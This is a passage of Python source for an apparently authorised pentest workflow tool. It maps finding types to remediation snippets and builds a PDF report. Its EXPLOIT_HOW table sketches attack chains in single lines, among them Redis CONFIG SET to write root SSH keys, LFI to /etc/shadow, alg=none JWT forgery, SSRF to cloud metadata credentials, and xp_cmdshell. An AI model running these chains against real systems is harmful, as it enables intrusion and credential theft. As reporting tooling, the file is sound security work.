                            "# redis.conf — rename dangerous commands\nrename-command KEYS \"\"\nrename-command CONFIG \"\"\nrename-command FLUSHALL \"\""),
    "cookie_flags":      ("Set HttpOnly, Secure, SameSite=Strict on all session cookies.",
                          "# Express.js\napp.use(session({\n  secret: 'strong-secret',\n  cookie: { httpOnly: true, secure: true, sameSite: 'strict' }\n}));\n\n# PHP\nsession_set_cookie_params(['httponly'=>true,'secure'=>true,'samesite'=>'Strict']);"),
    "missing_headers":   ("Add all security headers to all responses.",
                          "# nginx\nadd_header X-Frame-Options 'DENY';\nadd_header X-Content-Type-Options 'nosniff';\nadd_header Strict-Transport-Security 'max-age=31536000; includeSubDomains';\nadd_header Content-Security-Policy \"default-src 'self'\";"),
    "generic":           ("Review against OWASP Top-10 and CIS Benchmarks.",
                          "# Run authenticated scan\nnmap -sV --script=auth,vuln -p- <target>"),
}

EXPLOIT_HOW = {
    "open_port":        "Scan open ports to match service versions to ExploitDB/Metasploit modules.",
    "cve":              "Use matching Metasploit module or public PoC. Check NVD for CVSS vector and attack path.",
    "exploit_available":"Retrieve with `searchsploit -m <id>`, modify LHOST/RHOST, execute.",
    "web_finding":      "Misconfigs chain: info disclosure → credential harvest → auth bypass → RCE.",
    "default_cred":     "Authenticate with leaked cred, gain shell, pivot laterally.",
    "weak_tls":         "POODLE/BEAST downgrade attack decrypts traffic in MITM position.",
    "weak_cipher":      "RC4/3DES broken — MITM attacker decrypts in minutes.",
    "heartbleed":       "Send malformed heartbeat — leaks up to 64KB RAM per request (keys, sessions).",
    "banner_anomaly":   "Verbose banners feed directly into CVE/exploit matching.",
    "version_eol":      "All CVEs after EOL date are permanently unpatched on this build.",
    "blind_sqli":       "Time-based blind SQLi → dump DB → credential extraction → possible OS RCE.",
    "sql_injection":    "Error-based SQLi confirms injection — use sqlmap to dump databases.",
    "auth_timing_oracle":"Username enumeration via timing enables targeted password spraying.",
    "path_traversal":   "LFI /etc/passwd → /etc/shadow → SSH keys → log poisoning → RCE.",
    "host_header_injection":"Reflected Host enables cache poisoning, password reset hijacking, SSRF.",
    "bola_idor":        "Increment/change object IDs to access other users' data without authorization.",
    "broken_auth":      "alg=none JWT → forge any identity. Null token → auth bypass.",
    "ssrf":             "Internal metadata (AWS IMDS) → cloud credentials → full account takeover.",
    "mass_assignment":  "Send role=admin in body → privilege escalation without breaking any auth.",
    "nosql_injection":  "$gt/$ne operator bypass → login without credentials.",
    "db_unauth_access": "Direct DB access → dump all data, insert backdoor users, exfiltrate PII.",
    "db_default_cred":  "Login with default creds → full DB read/write → OS command via xp_cmdshell/UDF.",
    "redis_no_auth":    "CONFIG SET dir / CONFIG SET dbfilename → write SSH authorized_keys → root.",
    "protocol_vuln":    "Open relay, anon bind, DNS recursion → amplification/data exfiltration.",
    "generic":          "Manual analysis required in controlled environment.",
}


# ─────────────────────────────────────────────────────────────────────────────
# PDF BUILDER — full detailed report
# ─────────────────────────────────────────────────────────────────────────────
SEV_C = {
    "critical": colors.HexColor('#c53030'),
    "high":     colors.HexColor('#c05621'),
    "medium":   colors.HexColor('#b7791f'),
    "low":      colors.HexColor('#276749'),
    "info":     colors.HexColor('#2b6cb0'),
}
SEV_BG = {
    "critical": colors.HexColor('#fff5f5'),
    "high":     colors.HexColor('#fffaf0'),
    "medium":   colors.HexColor('#fffff0'),
    "low":      colors.HexColor('#f0fff4'),
    "info":     colors.HexColor('#ebf8ff'),
}

def build_pdf(sess: dict) -> str:
    path = f"{sess['outdir']}/report_{sess['sid'][:8]}.pdf"
    W = A4[0] - 3.6*cm

    doc = SimpleDocTemplate(path, pagesize=A4,
        leftMargin=1.8*cm, rightMargin=1.8*cm,
        topMargin=1.8*cm, bottomMargin=1.8*cm,
        title=f"Pentest Report — {sess['target']}")

    S = getSampleStyleSheet()
    def sty(name, **kw):
        return ParagraphStyle(name, **kw)

    N    = sty('N',  fontName='Helvetica',      fontSize=9,  leading=13)
    H1   = sty('H1', fontName='Helvetica-Bold', fontSize=20, spaceAfter=6,  textColor=colors.HexColor('#0d1117'))
    H2   = sty('H2', fontName='Helvetica-Bold', fontSize=13, spaceAfter=4,  spaceBefore=14, textColor=colors.HexColor('#0366d6'))
    H3   = sty('H3', fontName='Helvetica-Bold', fontSize=11, spaceAfter=3,  spaceBefore=8,  textColor=colors.HexColor('#24292e'))
    H4   = sty('H4', fontName='Helvetica-Bold', fontSize=9.5,spaceAfter=2,  spaceBefore=5,  textColor=colors.HexColor('#444d56'))
    META = sty('MT', fontName='Helvetica-Oblique', fontSize=8.5, textColor=colors.HexColor('#586069'))
    CODE = sty('CO', fontName='Courier-Bold', fontSize=8.5,
               backColor=colors.HexColor('#f6f8fa'),
               textColor=colors.HexColor('#1f2328'),
               borderColor=colors.HexColor('#d0d7de'), borderWidth=0.75,
               borderPadding=8, leading=13, leftIndent=4)
    WARN = sty('WN', fontName='Helvetica-Oblique', fontSize=8,
               textColor=colors.HexColor('#b31d28'),
               backColor=colors.HexColor('#ffeef0'), borderPadding=5)
    LABEL = sty('LB', fontName='Helvetica-Bold', fontSize=8,
                textColor=colors.HexColor('#586069'))
    SEC  = sty('SEC', fontName='Helvetica-Bold', fontSize=10,
               spaceBefore=8, spaceAfter=2, textColor=colors.HexColor('#0366d6'))

    story = []
    all_f = [f for flist in sess['findings'].values() for f in flist]
    sc = {s: sum(1 for f in all_f if f.get('severity')==s)
          for s in ['critical','high','medium','low','info']}

    # ── COVER ─────────────────────────────────────────────────────────────
    story += [
        Spacer(1, 0.8*cm),
        Paragraph("PENETRATION TEST REPORT", H1),
        HRFlowable(width="100%", thickness=3, color=colors.HexColor('#0366d6')),
        Spacer(1, 0.4*cm),
    ]
    cover_meta = [
        ["Target",        sess['raw_target']],
        ["Resolved Host", sess['target']],
        ["Target Type",   sess['target_type'].upper()],
        ["Scan Date",     sess['created'][:10]],
        ["Session ID",    sess['sid'][:8]],
        ["Stages Run",    str(len(sess['completed']))],
        ["Total Findings",str(len(all_f))],
        ["Critical",      str(sc.get('critical',0))],
        ["High",          str(sc.get('high',0))],
        ["Medium",        str(sc.get('medium',0))],
    ]
    cm_t = Table(cover_meta, colWidths=[4*cm, W-4*cm])
    cm_t.setStyle(TableStyle([
        ('FONTNAME',(0,0),(0,-1),'Helvetica-Bold'), ('FONTNAME',(1,0),(1,-1),'Helvetica'),
        ('FONTSIZE',(0,0),(-1,-1),9),
        ('ROWBACKGROUNDS',(0,0),(-1,-1),[colors.white,colors.HexColor('#f6f8fa')]),
        ('GRID',(0,0),(-1,-1),0.3,colors.HexColor('#e1e4e8')),
        ('TOPPADDING',(0,0),(-1,-1),4), ('BOTTOMPADDING',(0,0),(-1,-1),4),
    ]))
    story += [cm_t, Spacer(1,0.4*cm),
              Paragraph("⚠ AUTHORISED USE ONLY — Confidential. For the named recipient only.", WARN),
              PageBreak()]

    # ── EXEC SUMMARY ──────────────────────────────────────────────────────
    story += [
        Paragraph("1. Executive Summary", H2),
        HRFlowable(width="100%", thickness=0.5, color=colors.HexColor('#e1e4e8')),
        Spacer(1,0.2*cm),
    ]
    sla = {"critical":("Immediate","24 hours"),"high":("High","7 days"),
           "medium":("Medium","30 days"),"low":("Low","90 days"),"info":("Informational","Next cycle")}
    sev_rows = [["Severity","Count","Risk","Remediation SLA"]]
    for s in ["critical","high","medium","low","info"]:
        sev_rows.append([s.upper(), str(sc.get(s,0)), sla[s][0], sla[s][1]])
    st = Table(sev_rows, colWidths=[4*cm,2.5*cm,4*cm,6*cm])
    sev_ts = [
        ('FONTNAME',(0,0),(-1,0),'Helvetica-Bold'),('FONTNAME',(0,1),(-1,-1),'Helvetica'),
        ('FONTSIZE',(0,0),(-1,-1),9),
        ('BACKGROUND',(0,0),(-1,0),colors.HexColor('#0366d6')),
        ('TEXTCOLOR',(0,0),(-1,0),colors.white),
        ('ROWBACKGROUNDS',(0,1),(-1,-1),[colors.white,colors.HexColor('#f6f8fa')]),
        ('GRID',(0,0),(-1,-1),0.3,colors.HexColor('#e1e4e8')),
        ('TOPPADDING',(0,0),(-1,-1),4),('BOTTOMPADDING',(0,0),(-1,-1),4),
    ]
    for i,s in enumerate(['critical','high','medium','low','info'],1):
        sev_ts += [('TEXTCOLOR',(0,i),(0,i),SEV_C[s]),('FONTNAME',(0,i),(0,i),'Helvetica-Bold')]
    st.setStyle(TableStyle(sev_ts))
    story += [st, Spacer(1,0.3*cm)]

    # ── VULNERABILITY INDEX ────────────────────────────────────────────────
    story += [
        Paragraph("2. Vulnerability Index", H2),
        HRFlowable(width="100%", thickness=0.5, color=colors.HexColor('#e1e4e8')),
        Spacer(1,0.15*cm),
    ]
    idx_rows = [["#","Severity","Type","Path / Location","Stage"]]
    crit_high = [f for f in all_f if f.get('severity') in ('critical','high','medium')]
    for i, f in enumerate(crit_high[:60], 1):
        ftype = f.get('type','').replace('_',' ')
        detail = (f.get('detail') or f.get('cve') or '')[:60]
        fpath_idx = f.get('path','—')[:50]
        stage_name = '—'
        for stage in CHAIN:
            for sub in stage['substages']:
                if sub['id'] in sess['findings'] and f in sess['findings'][sub['id']]:
                    stage_name = stage['label'].replace('Stage ','S').split(' ')[0]
        idx_rows.append([str(i), f.get('severity','info').upper(), ftype[:25], fpath_idx, stage_name])
    if len(idx_rows) > 1:
        idx_t = Table(idx_rows, colWidths=[0.7*cm,2*cm,3.5*cm,7.5*cm,2.8*cm])
        idx_ts = [
            ('FONTNAME',(0,0),(-1,0),'Helvetica-Bold'),
            ('FONTSIZE',(0,0),(-1,-1),8),
            ('BACKGROUND',(0,0),(-1,0),colors.HexColor('#24292e')),
            ('TEXTCOLOR',(0,0),(-1,0),colors.white),
            ('ROWBACKGROUNDS',(0,1),(-1,-1),[colors.white,colors.HexColor('#f6f8fa')]),
            ('GRID',(0,0),(-1,-1),0.3,colors.HexColor('#e1e4e8')),
            ('TOPPADDING',(0,0),(-1,-1),3),('BOTTOMPADDING',(0,0),(-1,-1),3),
            ('VALIGN',(0,0),(-1,-1),'TOP'),
        ]
        for ri, f in enumerate(crit_high[:60], 1):
            c = SEV_C.get(f.get('severity','info'), colors.black)
            idx_ts += [('TEXTCOLOR',(1,ri),(1,ri),c),('FONTNAME',(1,ri),(1,ri),'Helvetica-Bold')]
        idx_t.setStyle(TableStyle(idx_ts))
        story += [idx_t, Spacer(1,0.3*cm)]
    story.append(PageBreak())

    # ── DETAILED FINDINGS ─────────────────────────────────────────────────
    story += [
        Paragraph("3. Detailed Findings with PoC & Remediation", H2),
        HRFlowable(width="100%", thickness=0.5, color=colors.HexColor('#e1e4e8')),
    ]
    finding_num = 0
    for stage in CHAIN:
        stage_findings_exist = any(
            sess['findings'].get(sub['id']) for sub in stage['substages']
        )
        if not stage_findings_exist:
            continue
        story.append(Paragraph(stage['label'], H2))

        for sub in stage['substages']:
            sub_findings = sess['findings'].get(sub['id'], [])
            if not sub_findings:
                continue
            stat = ("COMPLETED" if sub['id'] in sess['completed'] else
                    "SKIPPED" if sub['id'] in sess['skipped'] else "NOT RUN")
            story.append(Paragraph(
                f"{sub['label']} <font color='#586069' size='7.5'>[{stat}]</font>", H3))
            story.append(Paragraph(sub['description'], META))
            note = sess['notes'].get(sub['id'],'')
            if note:
                story.append(Paragraph(f"<b>Operator note:</b> {html.escape(note)}", META))
            story.append(Spacer(1,0.15*cm))

            for f in sub_findings:
                sev = f.get('severity','info')
                if sev not in ('critical','high','medium','low','info'):
                    sev = 'info'
                finding_num += 1
                ftype = f.get('type','generic')
                detail = f.get('detail') or f.get('cve') or f.get('line') or ''
                fpath = f.get('path','—')
                cmd = f.get('command') or sess['commands'].get(sub['id']) or '—'
                rem_tuple = REMEDIATION.get(ftype, REMEDIATION['generic'])
                rem_text, rem_code = (rem_tuple if isinstance(rem_tuple, tuple)
                                      else (rem_tuple, '# See vendor documentation'))
                exploit = EXPLOIT_HOW.get(ftype, EXPLOIT_HOW['generic'])

                # finding header bar
                hdr_data = [[
                    Paragraph(f"<b>#{finding_num}</b>", LABEL),
                    Paragraph(f"<b>{html.escape(detail[:120])}</b>", sty('FH',
                        fontName='Helvetica-Bold', fontSize=9,
                        textColor=SEV_C.get(sev, colors.black))),
                    Paragraph(sev.upper(), sty('SV',
                        fontName='Helvetica-Bold', fontSize=8,
                        textColor=colors.white,
                        backColor=SEV_C.get(sev, colors.gray),
                        borderPadding=3)),
                ]]
                hdr_t = Table(hdr_data, colWidths=[1*cm, W-4*cm, 3*cm])
                hdr_t.setStyle(TableStyle([
                    ('BACKGROUND',(0,0),(-1,-1),SEV_BG.get(sev, colors.white)),
                    ('BOX',(0,0),(-1,-1),0.8,SEV_C.get(sev,colors.gray)),
                    ('VALIGN',(0,0),(-1,-1),'MIDDLE'),
                    ('TOPPADDING',(0,0),(-1,-1),5),('BOTTOMPADDING',(0,0),(-1,-1),5),
                ]))

                # detail rows
                cvss = f.get('cvss', {}) or {}
                triage = f.get('triage', {}) or {}
                cvss_line = (f"CVSS {cvss.get('base_score','—')} ({cvss.get('severity_band','—')})"
                             + ("  ⚠ BAND MISMATCH" if cvss.get('band_mismatch') else ""))
                vector_line = cvss.get('vector') or '—'
                triage_line = triage.get('verdict', '—')
                if triage.get('provenance') == 'analyst':
                    triage_line += "  (operator overridden)"
                detail_rows = [
                    ["Type",         ftype.replace('_',' ').title()],
                    ["Path/Location",fpath],
                    ["CVSS v3.1",    cvss_line],
                    ["CVSS Vector",  vector_line],
                    ["Triage",       triage_line],
                    ["Detection Cmd",cmd],
                    ["How Exploited", exploit],
                    ["Remediation",  rem_text],
                ]
                evidence = f.get('evidence', {}) or {}
                ev_paths = []
                if isinstance(evidence, dict):
                    ev_paths = [os.path.basename(x) for x in evidence.get('screenshots', [])]
                    if evidence.get('pcap'):
                        ev_paths.append(os.path.basename(evidence['pcap']))
                if ev_paths:
                    detail_rows.append(["Evidence", ", ".join(ev_paths)])
                det_t = Table(detail_rows, colWidths=[3*cm, W-3*cm])
                det_t.setStyle(TableStyle([
                    ('FONTNAME',(0,0),(0,-1),'Helvetica-Bold'),
                    ('FONTNAME',(1,0),(1,-1),'Helvetica'),
                    ('FONTSIZE',(0,0),(-1,-1),8.5),
                    ('LEADING',(0,0),(-1,-1),12),
                    ('ROWBACKGROUNDS',(0,0),(-1,-1),[colors.HexColor('#fafbfc'),colors.white]),
                    ('GRID',(0,0),(-1,-1),0.3,colors.HexColor('#e1e4e8')),
                    ('VALIGN',(0,0),(-1,-1),'TOP'),
                    ('TOPPADDING',(0,0),(-1,-1),4),('BOTTOMPADDING',(0,0),(-1,-1),4),
                ]))

                # PoC / code fix
                poc_title = Paragraph("Proof of Concept / Detection", SEC)
                poc_code  = Preformatted(cmd if cmd and cmd != '—' else '# No detection command recorded.', CODE)
                fix_title = Paragraph("Remediation Code Example", SEC)
                fix_code  = Preformatted(rem_code if rem_code and rem_code != '#' else '# See vendor documentation.', CODE)

                story.append(KeepTogether([
                    hdr_t, Spacer(1,3),
                    det_t, Spacer(1,3),
                    poc_title, poc_code, Spacer(1,3),
                    fix_title, fix_code,
                    Spacer(1,0.3*cm),
                ]))

    story.append(PageBreak())

    # ── API VULNERABILITY SUMMARY ─────────────────────────────────────────
    api_findings = []
    for stage in CHAIN:
        if stage['id'] in ('api_scan',):
            for sub in stage['substages']:
                api_findings.extend(sess['findings'].get(sub['id'], []))

    if api_findings:
        story += [Paragraph("4. API Vulnerability Summary (OWASP API Top-10)", H2),
                  HRFlowable(width="100%", thickness=0.5, color=colors.HexColor('#e1e4e8')),
                  Spacer(1,0.15*cm)]
        api_map = {
            'bola_idor':          'API1 — Broken Object Level Authorization (BOLA/IDOR)',
            'broken_auth':        'API2 — Broken Authentication',
            'unauth_endpoint':    'API2 — Broken Authentication (unprotected endpoint)',
            'mass_assignment':    'API3 — Broken Object Property Level Authorization',
            'missing_rate_limit': 'API4 — Unrestricted Resource Consumption',
            'broken_function_auth':'API5 — Broken Function Level Authorization',
            'sql_injection':      'API8 — Security Misconfiguration / Injection',
            'nosql_injection':    'API8 — Security Misconfiguration / NoSQL Injection',
            'ssrf':               'API7 — Server-Side Request Forgery (SSRF)',
            'api_endpoint':       'API9 — Improper Inventory Management',
            'graphql_introspection':'API9 — Improper Inventory Management',
            'api_cors_wildcard':  'API8 — Security Misconfiguration (CORS)',
            'api_key_exposure':   'API10 — Unsafe Consumption of Third-Party APIs',
            'verbose_error':      'API8 — Security Misconfiguration (Verbose Errors)',
        }
        for f in api_findings:
            ftype = f.get('type','generic')
            owasp = api_map.get(ftype, 'API — Other')
            sev = f.get('severity','info')
            story.append(KeepTogether([
                Paragraph(f"<b>{owasp}</b> — <font color='{SEV_C.get(sev,colors.black).hexval() if hasattr(SEV_C.get(sev,colors.black),'hexval') else '#333333'}'>{sev.upper()}</font>", sty('AI', fontName='Helvetica-Bold', fontSize=9, spaceBefore=6)),
                Paragraph(f"<b>Path:</b> {html.escape(f.get('path','—'))}", N),
                Paragraph(f"<b>Detail:</b> {html.escape(f.get('detail','')[:200])}", N),
                Paragraph(f"<b>Command:</b> {html.escape(f.get('command','—'))}", META),
                Spacer(1,0.15*cm),
            ]))
        story.append(PageBreak())

    # ── DATABASE VULNERABILITY SUMMARY ────────────────────────────────────
    db_findings = []
    for stage in CHAIN:
        if stage['id'] == 'db_scan':
            for sub in stage['substages']:
                db_findings.extend(sess['findings'].get(sub['id'], []))

    if db_findings:
        story += [Paragraph("5. Database Vulnerability Summary", H2),
                  HRFlowable(width="100%", thickness=0.5, color=colors.HexColor('#e1e4e8')),
                  Spacer(1,0.15*cm)]
        for f in db_findings:
            sev = f.get('severity','info')
            story.append(KeepTogether([
                Paragraph(f"<b>{f.get('type','').replace('_',' ').upper()}</b>", sty('DT', fontName='Helvetica-Bold', fontSize=9, spaceBefore=6, textColor=SEV_C.get(sev,colors.black))),
                Paragraph(f"<b>Severity:</b> {sev.upper()} &nbsp; <b>Path:</b> {html.escape(f.get('path','—'))}", N),
                Paragraph(f"<b>Detail:</b> {html.escape(f.get('detail','')[:250])}", N),
                Paragraph(f"<b>Detection Command:</b> {html.escape(f.get('command','—'))}", META),
                Spacer(1,0.15*cm),
            ]))
        story.append(PageBreak())

    # ── CVSS SCORING & FALSE-POSITIVE TRIAGE ───────────────────────────────
    all_scored = [f for f in all_f if f.get('cvss', {}).get('base_score')]
    if all_scored or sess.get('assessment'):
        story += [
            Paragraph("6. CVSS Scoring & False-Positive Triage", H2),
            HRFlowable(width="100%", thickness=0.5, color=colors.HexColor('#e1e4e8')),
            Spacer(1,0.15*cm),
        ]
        if sess.get('assessment'):
            for ln in sess['assessment'].splitlines()[:60]:
                story.append(Paragraph(html.escape(ln), META)
                             if ('—' in ln or '|' in ln or 'cvss=' in ln)
                             else Preformatted(ln, CODE))
            story.append(Spacer(1,0.2*cm))
        t_rows = [["Type","Severity","CVSS","Band","Triage","Path"]]
        for f in all_scored[:60]:
            cvss = f.get('cvss', {})
            tgt = f.get('triage', {})
            t_rows.append([
                f.get('type','').replace('_',' ')[:22],
                f.get('severity','info').upper(),
                str(cvss.get('base_score','—')),
                cvss.get('severity_band','—') or '—',
                tgt.get('verdict','—'),
                (f.get('path') or '—')[:30],
            ])
        t_t = Table(t_rows, colWidths=[3.2*cm,1.8*cm,1.4*cm,1.8*cm,2.6*cm,5.7*cm])
        t_t.setStyle(TableStyle([
            ('FONTNAME',(0,0),(-1,0),'Helvetica-Bold'),
            ('FONTSIZE',(0,0),(-1,-1),7.5),
            ('BACKGROUND',(0,0),(-1,0),colors.HexColor('#2d3748')),
            ('TEXTCOLOR',(0,0),(-1,0),colors.white),
            ('ROWBACKGROUNDS',(0,1),(-1,-1),[colors.white,colors.HexColor('#f6f8fa')]),
            ('GRID',(0,0),(-1,-1),0.3,colors.HexColor('#e1e4e8')),
            ('TOPPADDING',(0,0),(-1,-1),3),('BOTTOMPADDING',(0,0),(-1,-1),3),
            ('VALIGN',(0,0),(-1,-1),'TOP'),
        ]))
        story += [t_t, Spacer(1,0.2*cm),
                  Paragraph("Confirmed findings carry an explicit CVSS v3.1 vector; values come from the "
                            "computed vector or from NVD for CVE-sourced findings.", META)]
        story.append(PageBreak())

    # ── RAW TOOL OUTPUT ───────────────────────────────────────────────────
    story += [
        Paragraph("7. Raw Tool Output", H2),
        HRFlowable(width="100%", thickness=0.5, color=colors.HexColor('#e1e4e8')),
    ]
    for stage in CHAIN:
        for sub in stage['substages']:
            out = sess['outputs'].get(sub['id'],'')
            if not out: continue
            story.append(Paragraph(f"{stage['label']} › {sub['label']}", H3))
            lines = out.splitlines()[:50]
            if len(out.splitlines()) > 50:
                lines.append(f'... [{len(out.splitlines())-50} lines truncated]')
            story.append(Preformatted('\n'.join(lines), CODE))
            story.append(Spacer(1,0.1*cm))
    story.append(PageBreak())

    # ── ZERO-DAY APPENDIX ─────────────────────────────────────────────────
    ZDAY_TYPES = {'banner_anomaly','version_eol','version_outdated','blind_sqli',
                  'auth_timing_oracle','timing_anomaly','path_traversal',
                  'host_header_injection','protocol_mismatch','signature_match',
                  'ssrf','nosql_injection','redis_no_auth'}
    zday = [f for f in all_f if f.get('type') in ZDAY_TYPES]
    story += [Paragraph("Appendix A — Zero-Day & Unknown Vulnerability Surface", H2),
              HRFlowable(width="100%", thickness=0.5, color=colors.HexColor('#e1e4e8')),
              Spacer(1,0.15*cm)]
    if zday:
        z_rows = [["#","Type","Path","Detail","Sev"]]
        for i,f in enumerate(zday[:30],1):
            z_rows.append([str(i), f.get('type','').replace('_',' ')[:20],
                f.get('path','—')[:30], (f.get('detail',''))[:80],
                f.get('severity','info').upper()])
        zt = Table(z_rows, colWidths=[0.7*cm,3.5*cm,3*cm,8*cm,2*cm])
        zt.setStyle(TableStyle([
            ('FONTNAME',(0,0),(-1,0),'Helvetica-Bold'),
            ('FONTSIZE',(0,0),(-1,-1),7.5),
            ('BACKGROUND',(0,0),(-1,0),colors.HexColor('#1a2332')),
            ('TEXTCOLOR',(0,0),(-1,0),colors.HexColor('#30a0ff')),
            ('ROWBACKGROUNDS',(0,1),(-1,-1),[colors.white,colors.HexColor('#f6f8fa')]),
            ('GRID',(0,0),(-1,-1),0.3,colors.HexColor('#e1e4e8')),
            ('TOPPADDING',(0,0),(-1,-1),3),('BOTTOMPADDING',(0,0),(-1,-1),3),
            ('VALIGN',(0,0),(-1,-1),'TOP'),
        ]))
        story += [zt, Spacer(1,0.2*cm)]
    else:
        story.append(Paragraph("No zero-day surface findings detected in this session.", META))

    # footer
    story += [
        Spacer(1,0.5*cm),
        HRFlowable(width="100%", thickness=0.5, color=colors.HexColor('#e1e4e8')),
        Paragraph(
            f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} UTC | "
            f"Pentest Workflow Manager v4 | Session {sess['sid'][:8]} | "
            "AUTHORISED USE ONLY",
            ParagraphStyle('FT', fontName='Helvetica', fontSize=7,
                           textColor=colors.HexColor('#586069'), alignment=TA_CENTER))
    ]

    doc.build(story)
    return path


if __name__ == '__main__':
    print(f"Pentest Workflow Manager v4 → http://{PWM_BIND}:{PWM_PORT}")
    print(f"  Overrides: PWM_BIND (default 127.0.0.1), PWM_PORT (default 5000), PWM_SECRET_KEY, PWM_API_TOKEN")
    print(f"  Command timeout: PWM_CMD_TIMEOUT={PWM_CMD_TIMEOUT:g}s default — 0 = no timeout (per-substage overrides only when >0)")

    def _janitor():
        import time as _t
        import contextlib
        while True:
            _t.sleep(300)
            stale = []
            for sid, sess in sessions.items():
                created = datetime.fromisoformat(sess.get('created', '')) if sess.get('created') else None
                if created and (_t.time() - created.timestamp()) > 6 * 3600:
                    stale.append(sid)
            for sid in stale:
                sess = sessions.get(sid)
                if sess:
                    with sess['lock']:
                        q = output_queues.get(sid)
                        if q is not None:
                            q.put({"event": "session_gone", "data": "{}"})
                        output_queues.pop(sid, None)
                        sessions.pop(sid, None)
                    shutil.rmtree(sess['outdir'], ignore_errors=True)
                    print(f"[janitor] purged stale session {sid}")

    threading.Thread(target=_janitor, daemon=True).start()
    app.run(debug=False, threaded=True, host=PWM_BIND, port=PWM_PORT)
